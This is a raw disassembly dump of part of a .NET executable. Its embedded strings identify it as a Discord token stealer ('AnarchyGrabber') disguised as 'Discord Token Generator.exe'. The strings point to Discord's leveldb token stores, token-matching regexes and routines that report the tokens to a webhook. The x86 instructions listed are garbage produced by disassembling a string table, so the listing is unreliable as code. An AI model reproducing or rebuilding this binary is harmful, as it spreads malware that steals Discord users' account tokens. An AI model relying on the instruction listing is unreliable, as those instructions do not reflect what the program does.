  402bcf:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  402bd2:	61                   	popa
  402bd3:	72 6b                	jb     0x402c40
  402bd5:	41                   	inc    %ecx
  402bd6:	74 74                	je     0x402c4c
  402bd8:	72 69                	jb     0x402c43
  402bda:	62 75 74             	bound  %esi,0x74(%ebp)
  402bdd:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402be2:	67 65 74 46          	addr16 gs je 0x402c2c
  402be6:	72 61                	jb     0x402c49
  402be8:	6d                   	insl   (%dx),%es:(%edi)
  402be9:	65 77 6f             	gs ja  0x402c5b
  402bec:	72 6b                	jb     0x402c59
  402bee:	41                   	inc    %ecx
  402bef:	74 74                	je     0x402c65
  402bf1:	72 69                	jb     0x402c5c
  402bf3:	62 75 74             	bound  %esi,0x74(%ebp)
  402bf6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402bfa:	73 65                	jae    0x402c61
  402bfc:	6d                   	insl   (%dx),%es:(%edi)
  402bfd:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402c01:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402c08:	69 
  402c09:	6f                   	outsl  %ds:(%esi),(%dx)
  402c0a:	6e                   	outsb  %ds:(%esi),(%dx)
  402c0b:	41                   	inc    %ecx
  402c0c:	74 74                	je     0x402c82
  402c0e:	72 69                	jb     0x402c79
  402c10:	62 75 74             	bound  %esi,0x74(%ebp)
  402c13:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402c17:	73 65                	jae    0x402c7e
  402c19:	6d                   	insl   (%dx),%es:(%edi)
  402c1a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402c1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c1f:	6e                   	outsb  %ds:(%esi),(%dx)
  402c20:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402c26:	74 69                	je     0x402c91
  402c28:	6f                   	outsl  %ds:(%esi),(%dx)
  402c29:	6e                   	outsb  %ds:(%esi),(%dx)
  402c2a:	41                   	inc    %ecx
  402c2b:	74 74                	je     0x402ca1
  402c2d:	72 69                	jb     0x402c98
  402c2f:	62 75 74             	bound  %esi,0x74(%ebp)
  402c32:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402c36:	73 65                	jae    0x402c9d
  402c38:	6d                   	insl   (%dx),%es:(%edi)
  402c39:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402c3d:	65 73 63             	gs jae 0x402ca3
  402c40:	72 69                	jb     0x402cab
  402c42:	70 74                	jo     0x402cb8
  402c44:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402c4b:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  402c52:	6f                   	outsl  %ds:(%esi),(%dx)
  402c53:	6d                   	insl   (%dx),%es:(%edi)
  402c54:	70 69                	jo     0x402cbf
  402c56:	6c                   	insb   (%dx),%es:(%edi)
  402c57:	61                   	popa
  402c58:	74 69                	je     0x402cc3
  402c5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402c5c:	52                   	push   %edx
  402c5d:	65 6c                	gs insb (%dx),%es:(%edi)
  402c5f:	61                   	popa
  402c60:	78 61                	js     0x402cc3
  402c62:	74 69                	je     0x402ccd
  402c64:	6f                   	outsl  %ds:(%esi),(%dx)
  402c65:	6e                   	outsb  %ds:(%esi),(%dx)
  402c66:	73 41                	jae    0x402ca9
  402c68:	74 74                	je     0x402cde
  402c6a:	72 69                	jb     0x402cd5
  402c6c:	62 75 74             	bound  %esi,0x74(%ebp)
  402c6f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402c73:	73 65                	jae    0x402cda
  402c75:	6d                   	insl   (%dx),%es:(%edi)
  402c76:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402c7a:	72 6f                	jb     0x402ceb
  402c7c:	64 75 63             	fs jne 0x402ce2
  402c7f:	74 41                	je     0x402cc2
  402c81:	74 74                	je     0x402cf7
  402c83:	72 69                	jb     0x402cee
  402c85:	62 75 74             	bound  %esi,0x74(%ebp)
  402c88:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402c8c:	73 65                	jae    0x402cf3
  402c8e:	6d                   	insl   (%dx),%es:(%edi)
  402c8f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402c93:	6f                   	outsl  %ds:(%esi),(%dx)
  402c94:	70 79                	jo     0x402d0f
  402c96:	72 69                	jb     0x402d01
  402c98:	67 68 74 41 74 74    	addr16 push $0x74744174
  402c9e:	72 69                	jb     0x402d09
  402ca0:	62 75 74             	bound  %esi,0x74(%ebp)
  402ca3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ca7:	73 65                	jae    0x402d0e
  402ca9:	6d                   	insl   (%dx),%es:(%edi)
  402caa:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402cae:	6f                   	outsl  %ds:(%esi),(%dx)
  402caf:	6d                   	insl   (%dx),%es:(%edi)
  402cb0:	70 61                	jo     0x402d13
  402cb2:	6e                   	outsb  %ds:(%esi),(%dx)
  402cb3:	79 41                	jns    0x402cf6
  402cb5:	74 74                	je     0x402d2b
  402cb7:	72 69                	jb     0x402d22
  402cb9:	62 75 74             	bound  %esi,0x74(%ebp)
  402cbc:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402cc0:	6e                   	outsb  %ds:(%esi),(%dx)
  402cc1:	74 69                	je     0x402d2c
  402cc3:	6d                   	insl   (%dx),%es:(%edi)
  402cc4:	65 43                	gs inc %ebx
  402cc6:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc7:	6d                   	insl   (%dx),%es:(%edi)
  402cc8:	70 61                	jo     0x402d2b
  402cca:	74 69                	je     0x402d35
  402ccc:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402ccf:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402cd6:	69 
  402cd7:	62 75 74             	bound  %esi,0x74(%ebp)
  402cda:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402cde:	74 5f                	je     0x402d3f
  402ce0:	56                   	push   %esi
  402ce1:	61                   	popa
  402ce2:	6c                   	insb   (%dx),%es:(%edi)
  402ce3:	75 65                	jne    0x402d4a
  402ce5:	00 76 61             	add    %dh,0x61(%esi)
  402ce8:	6c                   	insb   (%dx),%es:(%edi)
  402ce9:	75 65                	jne    0x402d50
  402ceb:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  402cef:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402cf2:	64 20 54 6f 6b       	and    %dl,%fs:0x6b(%edi,%ebp,2)
  402cf7:	65 6e                	outsb  %gs:(%esi),(%dx)
  402cf9:	20 47 65             	and    %al,0x65(%edi)
  402cfc:	6e                   	outsb  %ds:(%esi),(%dx)
  402cfd:	65 72 61             	gs jb  0x402d61
  402d00:	74 6f                	je     0x402d71
  402d02:	72 2e                	jb     0x402d32
  402d04:	65 78 65             	gs js  0x402d6c
  402d07:	00 53 79             	add    %dl,0x79(%ebx)
  402d0a:	73 74                	jae    0x402d80
  402d0c:	65 6d                	gs insl (%dx),%es:(%edi)
  402d0e:	2e 52                	cs push %edx
  402d10:	75 6e                	jne    0x402d80
  402d12:	74 69                	je     0x402d7d
  402d14:	6d                   	insl   (%dx),%es:(%edi)
  402d15:	65 2e 56             	gs cs push %esi
  402d18:	65 72 73             	gs jb  0x402d8e
  402d1b:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402d22:	53                   	push   %ebx
  402d23:	74 72                	je     0x402d97
  402d25:	69 6e 67 00 4d 61 74 	imul   $0x74614d00,0x67(%esi),%ebp
  402d2c:	63 68 00             	arpl   %ebp,0x0(%eax)
  402d2f:	5f                   	pop    %edi
  402d30:	73 65                	jae    0x402d97
  402d32:	72 76                	jb     0x402daa
  402d34:	69 63 65 50 61 74 68 	imul   $0x68746150,0x65(%ebx),%esp
  402d3b:	00 47 65             	add    %al,0x65(%edi)
  402d3e:	74 46                	je     0x402d86
  402d40:	6f                   	outsl  %ds:(%esi),(%dx)
  402d41:	6c                   	insb   (%dx),%es:(%edi)
  402d42:	64 65 72 50          	fs gs jb 0x402d96
  402d46:	61                   	popa
  402d47:	74 68                	je     0x402db1
  402d49:	00 70 61             	add    %dh,0x61(%eax)
  402d4c:	74 68                	je     0x402db6
  402d4e:	00 57 65             	add    %dl,0x65(%edi)
  402d51:	62 68 6f             	bound  %ebp,0x6f(%eax)
  402d54:	6f                   	outsl  %ds:(%esi),(%dx)
  402d55:	6b 00 5f             	imul   $0x5f,(%eax),%eax
  402d58:	68 6f 6f 6b 55       	push   $0x556b6f6f
  402d5d:	72 6c                	jb     0x402dcb
  402d5f:	00 50 72             	add    %dl,0x72(%eax)
  402d62:	6f                   	outsl  %ds:(%esi),(%dx)
  402d63:	67 72 61             	addr16 jb 0x402dc7
  402d66:	6d                   	insl   (%dx),%es:(%edi)
  402d67:	00 67 65             	add    %ah,0x65(%edi)
  402d6a:	74 5f                	je     0x402dcb
  402d6c:	49                   	dec    %ecx
  402d6d:	74 65                	je     0x402dd4
  402d6f:	6d                   	insl   (%dx),%es:(%edi)
  402d70:	00 73 65             	add    %dh,0x65(%ebx)
  402d73:	74 5f                	je     0x402dd4
  402d75:	49                   	dec    %ecx
  402d76:	74 65                	je     0x402ddd
  402d78:	6d                   	insl   (%dx),%es:(%edi)
  402d79:	00 53 79             	add    %dl,0x79(%ebx)
  402d7c:	73 74                	jae    0x402df2
  402d7e:	65 6d                	gs insl (%dx),%es:(%edi)
  402d80:	00 4d 61             	add    %cl,0x61(%ebp)
  402d83:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  402d8a:	00 53 79             	add    %dl,0x79(%ebx)
  402d8d:	73 74                	jae    0x402e03
  402d8f:	65 6d                	gs insl (%dx),%es:(%edi)
  402d91:	2e 52                	cs push %edx
  402d93:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402d96:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402d9b:	6e                   	outsb  %ds:(%esi),(%dx)
  402d9c:	00 4d 61             	add    %cl,0x61(%ebp)
  402d9f:	74 63                	je     0x402e04
  402da1:	68 43 6f 6c 6c       	push   $0x6c6c6f43
  402da6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402dab:	6e                   	outsb  %ds:(%esi),(%dx)
  402dac:	00 46 69             	add    %al,0x69(%esi)
  402daf:	6c                   	insb   (%dx),%es:(%edi)
  402db0:	65 49                	gs dec %ecx
  402db2:	6e                   	outsb  %ds:(%esi),(%dx)
  402db3:	66 6f                	outsw  %ds:(%esi),(%dx)
  402db5:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  402db9:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  402dbe:	79 49                	jns    0x402e09
  402dc0:	6e                   	outsb  %ds:(%esi),(%dx)
  402dc1:	66 6f                	outsw  %ds:(%esi),(%dx)
  402dc3:	00 53 79             	add    %dl,0x79(%ebx)
  402dc6:	73 74                	jae    0x402e3c
  402dc8:	65 6d                	gs insl (%dx),%es:(%edi)
  402dca:	2e 4e                	cs dec %esi
  402dcc:	65 74 2e             	gs je  0x402dfd
  402dcf:	48                   	dec    %eax
  402dd0:	74 74                	je     0x402e46
  402dd2:	70 00                	jo     0x402dd4
  402dd4:	53                   	push   %ebx
  402dd5:	79 73                	jns    0x402e4a
  402dd7:	74 65                	je     0x402e3e
  402dd9:	6d                   	insl   (%dx),%es:(%edi)
  402dda:	2e 4c                	cs dec %esp
  402ddc:	69 6e 71 00 41 6e 61 	imul   $0x616e4100,0x71(%esi),%ebp
  402de3:	72 63                	jb     0x402e48
  402de5:	68 79 47 72 61       	push   $0x61724779
  402dea:	62 62 65             	bound  %esp,0x65(%edx)
  402ded:	72 00                	jb     0x402def
  402def:	53                   	push   %ebx
  402df0:	74 72                	je     0x402e64
  402df2:	65 61                	gs popa
  402df4:	6d                   	insl   (%dx),%es:(%edi)
  402df5:	52                   	push   %edx
  402df6:	65 61                	gs popa
  402df8:	64 65 72 00          	fs gs jb 0x402dfc
  402dfc:	54                   	push   %esp
  402dfd:	65 78 74             	gs js  0x402e74
  402e00:	52                   	push   %edx
  402e01:	65 61                	gs popa
  402e03:	64 65 72 00          	fs gs jb 0x402e07
  402e07:	53                   	push   %ebx
  402e08:	70 65                	jo     0x402e6f
  402e0a:	63 69 61             	arpl   %ebp,0x61(%ecx)
  402e0d:	6c                   	insb   (%dx),%es:(%edi)
  402e0e:	46                   	inc    %esi
  402e0f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e10:	6c                   	insb   (%dx),%es:(%edi)
  402e11:	64 65 72 00          	fs gs jb 0x402e15
  402e15:	47                   	inc    %edi
  402e16:	65 74 41             	gs je  0x402e5a
  402e19:	77 61                	ja     0x402e7c
  402e1b:	69 74 65 72 00 64 69 	imul   $0x72696400,0x72(%ebp,%eiz,2),%esi
  402e22:	72 
  402e23:	00 49 45             	add    %cl,0x45(%ecx)
  402e26:	6e                   	outsb  %ds:(%esi),(%dx)
  402e27:	75 6d                	jne    0x402e96
  402e29:	65 72 61             	gs jb  0x402e8d
  402e2c:	74 6f                	je     0x402e9d
  402e2e:	72 00                	jb     0x402e30
  402e30:	47                   	inc    %edi
  402e31:	65 74 45             	gs je  0x402e79
  402e34:	6e                   	outsb  %ds:(%esi),(%dx)
  402e35:	75 6d                	jne    0x402ea4
  402e37:	65 72 61             	gs jb  0x402e9b
  402e3a:	74 6f                	je     0x402eab
  402e3c:	72 00                	jb     0x402e3e
  402e3e:	44                   	inc    %esp
  402e3f:	69 73 63 6f 72 64 20 	imul   $0x2064726f,0x63(%ebx),%esi
  402e46:	54                   	push   %esp
  402e47:	6f                   	outsl  %ds:(%esi),(%dx)
  402e48:	6b 65 6e 20          	imul   $0x20,0x6e(%ebp),%esp
  402e4c:	47                   	inc    %edi
  402e4d:	65 6e                	outsb  %gs:(%esi),(%dx)
  402e4f:	65 72 61             	gs jb  0x402eb3
  402e52:	74 6f                	je     0x402ec3
  402e54:	72 00                	jb     0x402e56
  402e56:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  402e5b:	00 2e                	add    %ch,(%esi)
  402e5d:	63 63 74             	arpl   %esp,0x74(%ebx)
  402e60:	6f                   	outsl  %ds:(%esi),(%dx)
  402e61:	72 00                	jb     0x402e63
  402e63:	53                   	push   %ebx
  402e64:	79 73                	jns    0x402ed9
  402e66:	74 65                	je     0x402ecd
  402e68:	6d                   	insl   (%dx),%es:(%edi)
  402e69:	2e 44                	cs inc %esp
  402e6b:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402e72:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  402e79:	74 65                	je     0x402ee0
  402e7b:	6d                   	insl   (%dx),%es:(%edi)
  402e7c:	2e 52                	cs push %edx
  402e7e:	75 6e                	jne    0x402eee
  402e80:	74 69                	je     0x402eeb
  402e82:	6d                   	insl   (%dx),%es:(%edi)
  402e83:	65 2e 49             	gs cs dec %ecx
  402e86:	6e                   	outsb  %ds:(%esi),(%dx)
  402e87:	74 65                	je     0x402eee
  402e89:	72 6f                	jb     0x402efa
  402e8b:	70 53                	jo     0x402ee0
  402e8d:	65 72 76             	gs jb  0x402f06
  402e90:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  402e97:	73 74                	jae    0x402f0d
  402e99:	65 6d                	gs insl (%dx),%es:(%edi)
  402e9b:	2e 52                	cs push %edx
  402e9d:	75 6e                	jne    0x402f0d
  402e9f:	74 69                	je     0x402f0a
  402ea1:	6d                   	insl   (%dx),%es:(%edi)
  402ea2:	65 2e 43             	gs cs inc %ebx
  402ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea6:	6d                   	insl   (%dx),%es:(%edi)
  402ea7:	70 69                	jo     0x402f12
  402ea9:	6c                   	insb   (%dx),%es:(%edi)
  402eaa:	65 72 53             	gs jb  0x402f00
  402ead:	65 72 76             	gs jb  0x402f26
  402eb0:	69 63 65 73 00 5f 73 	imul   $0x735f0073,0x65(%ebx),%esp
  402eb7:	65 72 76             	gs jb  0x402f30
  402eba:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  402ec1:	62 75 67             	bound  %esi,0x67(%ebp)
  402ec4:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  402ecb:	65 
  402ecc:	73 00                	jae    0x402ece
  402ece:	4d                   	dec    %ebp
  402ecf:	61                   	popa
  402ed0:	74 63                	je     0x402f35
  402ed2:	68 65 73 00 47       	push   $0x47007365
  402ed7:	65 74 46             	gs je  0x402f20
  402eda:	69 6c 65 73 00 5f 73 	imul   $0x65735f00,0x73(%ebp,%eiz,2),%ebp
  402ee1:	65 
  402ee2:	61                   	popa
  402ee3:	72 63                	jb     0x402f48
  402ee5:	68 4c 6f 67 73       	push   $0x73676f4c
  402eea:	00 63 68             	add    %ah,0x68(%ebx)
  402eed:	65 63 6b 4c          	arpl   %ebp,%gs:0x4c(%ebx)
  402ef1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef2:	67 73 00             	addr16 jae 0x402ef5
  402ef5:	6c                   	insb   (%dx),%es:(%edi)
  402ef6:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef7:	67 73 00             	addr16 jae 0x402efa
  402efa:	61                   	popa
  402efb:	72 67                	jb     0x402f64
  402efd:	73 00                	jae    0x402eff
  402eff:	53                   	push   %ebx
  402f00:	79 73                	jns    0x402f75
  402f02:	74 65                	je     0x402f69
  402f04:	6d                   	insl   (%dx),%es:(%edi)
  402f05:	2e 54                	cs push %esp
  402f07:	68 72 65 61 64       	push   $0x64616572
  402f0c:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  402f13:	6b 73 00 47          	imul   $0x47,0x0(%ebx),%esi
  402f17:	65 74 54             	gs je  0x402f6e
  402f1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f1b:	6b 65 6e 73          	imul   $0x73,0x6e(%ebp),%esp
  402f1f:	00 52 65             	add    %dl,0x65(%edx)
  402f22:	70 6f                	jo     0x402f93
  402f24:	72 74                	jb     0x402f9a
  402f26:	54                   	push   %esp
  402f27:	6f                   	outsl  %ds:(%esi),(%dx)
  402f28:	6b 65 6e 73          	imul   $0x73,0x6e(%ebp),%esp
  402f2c:	00 53 79             	add    %dl,0x79(%ebx)
  402f2f:	73 74                	jae    0x402fa5
  402f31:	65 6d                	gs insl (%dx),%es:(%edi)
  402f33:	2e 54                	cs push %esp
  402f35:	65 78 74             	gs js  0x402fac
  402f38:	2e 52                	cs push %edx
  402f3a:	65 67 75 6c          	gs addr16 jne 0x402faa
  402f3e:	61                   	popa
  402f3f:	72 45                	jb     0x402f86
  402f41:	78 70                	js     0x402fb3
  402f43:	72 65                	jb     0x402faa
  402f45:	73 73                	jae    0x402fba
  402f47:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  402f4e:	73 74                	jae    0x402fc4
  402f50:	65 6d                	gs insl (%dx),%es:(%edi)
  402f52:	2e 43                	cs inc %ebx
  402f54:	6f                   	outsl  %ds:(%esi),(%dx)
  402f55:	6c                   	insb   (%dx),%es:(%edi)
  402f56:	6c                   	insb   (%dx),%es:(%edi)
  402f57:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  402f5d:	73 00                	jae    0x402f5f
  402f5f:	43                   	inc    %ebx
  402f60:	6f                   	outsl  %ds:(%esi),(%dx)
  402f61:	6e                   	outsb  %ds:(%esi),(%dx)
  402f62:	63 61 74             	arpl   %esp,0x74(%ecx)
  402f65:	00 4f 62             	add    %cl,0x62(%edi)
  402f68:	6a 65                	push   $0x65
  402f6a:	63 74 00 44          	arpl   %esi,0x44(%eax,%eax,1)
  402f6e:	69 73 74 69 6e 63 74 	imul   $0x74636e69,0x74(%ebx),%esi
  402f75:	00 47 65             	add    %al,0x65(%edi)
  402f78:	74 52                	je     0x402fcc
  402f7a:	65 73 75             	gs jae 0x402ff2
  402f7d:	6c                   	insb   (%dx),%es:(%edi)
  402f7e:	74 00                	je     0x402f80
  402f80:	48                   	dec    %eax
  402f81:	74 74                	je     0x402ff7
  402f83:	70 43                	jo     0x402fc8
  402f85:	6c                   	insb   (%dx),%es:(%edi)
  402f86:	69 65 6e 74 00 45 6e 	imul   $0x6e450074,0x6e(%ebp),%esp
  402f8d:	76 69                	jbe    0x402ff8
  402f8f:	72 6f                	jb     0x403000
  402f91:	6e                   	outsb  %ds:(%esi),(%dx)
  402f92:	6d                   	insl   (%dx),%es:(%edi)
  402f93:	65 6e                	outsb  %gs:(%esi),(%dx)
  402f95:	74 00                	je     0x402f97
  402f97:	67 65 74 5f          	addr16 gs je 0x402ffa
  402f9b:	43                   	inc    %ebx
  402f9c:	75 72                	jne    0x403010
  402f9e:	72 65                	jb     0x403005
  402fa0:	6e                   	outsb  %ds:(%esi),(%dx)
  402fa1:	74 00                	je     0x402fa3
  402fa3:	46                   	inc    %esi
  402fa4:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa5:	72 6d                	jb     0x403014
  402fa7:	55                   	push   %ebp
  402fa8:	72 6c                	jb     0x403016
  402faa:	45                   	inc    %ebp
  402fab:	6e                   	outsb  %ds:(%esi),(%dx)
  402fac:	63 6f 64             	arpl   %ebp,0x64(%edi)
  402faf:	65 64 43             	gs fs inc %ebx
  402fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  402fb3:	6e                   	outsb  %ds:(%esi),(%dx)
  402fb4:	74 65                	je     0x40301b
  402fb6:	6e                   	outsb  %ds:(%esi),(%dx)
  402fb7:	74 00                	je     0x402fb9
  402fb9:	48                   	dec    %eax
  402fba:	74 74                	je     0x403030
  402fbc:	70 43                	jo     0x403001
  402fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  402fbf:	6e                   	outsb  %ds:(%esi),(%dx)
  402fc0:	74 65                	je     0x403027
  402fc2:	6e                   	outsb  %ds:(%esi),(%dx)
  402fc3:	74 00                	je     0x402fc5
  402fc5:	67 65 74 5f          	addr16 gs je 0x403028
  402fc9:	43                   	inc    %ebx
  402fca:	6f                   	outsl  %ds:(%esi),(%dx)
  402fcb:	75 6e                	jne    0x40303b
  402fcd:	74 00                	je     0x402fcf
  402fcf:	49                   	dec    %ecx
  402fd0:	6e                   	outsb  %ds:(%esi),(%dx)
  402fd1:	73 65                	jae    0x403038
  402fd3:	72 74                	jb     0x403049
  402fd5:	00 54 6f 6b          	add    %dl,0x6b(%edi,%ebp,2)
  402fd9:	65 6e                	outsb  %gs:(%esi),(%dx)
  402fdb:	52                   	push   %edx
  402fdc:	65 70 6f             	gs jo  0x40304e
  402fdf:	72 74                	jb     0x403055
  402fe1:	00 74 6f 6b          	add    %dh,0x6b(%edi,%ebp,2)
  402fe5:	65 6e                	outsb  %gs:(%esi),(%dx)
  402fe7:	52                   	push   %edx
  402fe8:	65 70 6f             	gs jo  0x40305a
  402feb:	72 74                	jb     0x403061
  402fed:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  402ff1:	69 73 74 00 4d 6f 76 	imul   $0x766f4d00,0x74(%ebx),%esi
  402ff8:	65 4e                	gs dec %esi
  402ffa:	65 78 74             	gs js  0x403071
  402ffd:	00 4f 70             	add    %cl,0x70(%edi)
  403000:	65 6e                	outsb  %gs:(%esi),(%dx)
  403002:	54                   	push   %esp
  403003:	65 78 74             	gs js  0x40307a
  403006:	00 52 65             	add    %dl,0x65(%edx)
  403009:	67 65 78 00          	addr16 gs js 0x40300d
  40300d:	00 00                	add    %al,(%eax)
  40300f:	00 00                	add    %al,(%eax)
  403011:	13 5c 00 41          	adc    0x41(%eax,%eax,1),%ebx
  403015:	00 70 00             	add    %dh,0x0(%eax)
  403018:	70 00                	jo     0x40301a
  40301a:	44                   	inc    %esp
  40301b:	00 61 00             	add    %ah,0x0(%ecx)
  40301e:	74 00                	je     0x403020
  403020:	61                   	popa
  403021:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  403025:	2d 5c 00 4c 00       	sub    $0x4c005c,%eax
  40302a:	6f                   	outsl  %ds:(%esi),(%dx)
  40302b:	00 63 00             	add    %ah,0x0(%ebx)
  40302e:	61                   	popa
  40302f:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  403033:	00 53 00             	add    %dl,0x0(%ebx)
  403036:	74 00                	je     0x403038
  403038:	6f                   	outsl  %ds:(%esi),(%dx)
  403039:	00 72 00             	add    %dh,0x0(%edx)
  40303c:	61                   	popa
  40303d:	00 67 00             	add    %ah,0x0(%edi)
  403040:	65 00 5c 00 6c       	add    %bl,%gs:0x6c(%eax,%eax,1)
  403045:	00 65 00             	add    %ah,0x0(%ebp)
  403048:	76 00                	jbe    0x40304a
  40304a:	65 00 6c 00 64       	add    %ch,%gs:0x64(%eax,%eax,1)
  40304f:	00 62 00             	add    %ah,0x0(%edx)
  403052:	00 0b                	add    %cl,(%ebx)
  403054:	2a 00                	sub    (%eax),%al
  403056:	2e 00 6c 00 64       	add    %ch,%cs:0x64(%eax,%eax,1)
  40305b:	00 62 00             	add    %ah,0x0(%edx)
  40305e:	00 0b                	add    %cl,(%ebx)
  403060:	2a 00                	sub    (%eax),%al
  403062:	2e 00 6c 00 6f       	add    %ch,%cs:0x6f(%eax,%eax,1)
  403067:	00 67 00             	add    %ah,0x0(%edi)
  40306a:	00 3d 5b 00 5c 00    	add    %bh,0x5c005b
  403070:	77 00                	ja     0x403072
  403072:	2d 00 5d 00 7b       	sub    $0x7b005d00,%eax
  403077:	00 32                	add    %dh,(%edx)
  403079:	00 34 00             	add    %dh,(%eax,%eax,1)
  40307c:	7d 00                	jge    0x40307e
  40307e:	5c                   	pop    %esp
  40307f:	00 2e                	add    %ch,(%esi)
  403081:	00 5b 00             	add    %bl,0x0(%ebx)
  403084:	5c                   	pop    %esp
  403085:	00 77 00             	add    %dh,0x0(%edi)
  403088:	2d 00 5d 00 7b       	sub    $0x7b005d00,%eax
  40308d:	00 36                	add    %dh,(%esi)
  40308f:	00 7d 00             	add    %bh,0x0(%ebp)
  403092:	5c                   	pop    %esp
  403093:	00 2e                	add    %ch,(%esi)
  403095:	00 5b 00             	add    %bl,0x0(%ebx)
  403098:	5c                   	pop    %esp
  403099:	00 77 00             	add    %dh,0x0(%edi)
  40309c:	2d 00 5d 00 7b       	sub    $0x7b005d00,%eax
  4030a1:	00 32                	add    %dh,(%edx)
  4030a3:	00 37                	add    %dh,(%edi)
  4030a5:	00 7d 00             	add    %bh,0x0(%ebp)
  4030a8:	01 1d 6d 00 66 00    	add    %ebx,0x66006d
  4030ae:	61                   	popa
  4030af:	00 5c 00 2e          	add    %bl,0x2e(%eax,%eax,1)
  4030b3:	00 5b 00             	add    %bl,0x0(%ebx)
  4030b6:	5c                   	pop    %esp
  4030b7:	00 77 00             	add    %dh,0x0(%edi)
  4030ba:	2d 00 5d 00 7b       	sub    $0x7b005d00,%eax
  4030bf:	00 38                	add    %bh,(%eax)
  4030c1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4030c4:	7d 00                	jge    0x4030c6
  4030c6:	01 13                	add    %edx,(%ebx)
  4030c8:	20 00                	and    %al,(%eax)
  4030ca:	2d 00 20 00 4e       	sub    $0x4e002000,%eax
  4030cf:	00 45 00             	add    %al,0x0(%ebp)
  4030d2:	57                   	push   %edi
  4030d3:	00 45 00             	add    %al,0x0(%ebp)
  4030d6:	53                   	push   %ebx
  4030d7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  4030db:	0f 44 00             	cmove  (%eax),%eax
  4030de:	69 00 73 00 63 00    	imul   $0x630073,(%eax),%eax
  4030e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e5:	00 72 00             	add    %dh,0x0(%edx)
  4030e8:	64 00 00             	add    %al,%fs:(%eax)
  4030eb:	1f                   	pop    %ds
  4030ec:	52                   	push   %edx
  4030ed:	00 6f 00             	add    %ch,0x0(%edi)
  4030f0:	61                   	popa
  4030f1:	00 6d 00             	add    %ch,0x0(%ebp)
  4030f4:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4030fa:	5c                   	pop    %esp
  4030fb:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  4030ff:	00 73 00             	add    %dh,0x0(%ebx)
  403102:	63 00                	arpl   %eax,(%eax)
  403104:	6f                   	outsl  %ds:(%esi),(%dx)
  403105:	00 72 00             	add    %dh,0x0(%edx)
  403108:	64 00 00             	add    %al,%fs:(%eax)
  40310b:	1d 44 00 69 00       	sbb    $0x690044,%eax
  403110:	73 00                	jae    0x403112
  403112:	63 00                	arpl   %eax,(%eax)
  403114:	6f                   	outsl  %ds:(%esi),(%dx)
  403115:	00 72 00             	add    %dh,0x0(%edx)
  403118:	64 00 20             	add    %ah,%fs:(%eax)
  40311b:	00 43 00             	add    %al,0x0(%ebx)
  40311e:	61                   	popa
  40311f:	00 6e 00             	add    %ch,0x0(%esi)
  403122:	61                   	popa
  403123:	00 72 00             	add    %dh,0x0(%edx)
  403126:	79 00                	jns    0x403128
  403128:	00 2b                	add    %ch,(%ebx)
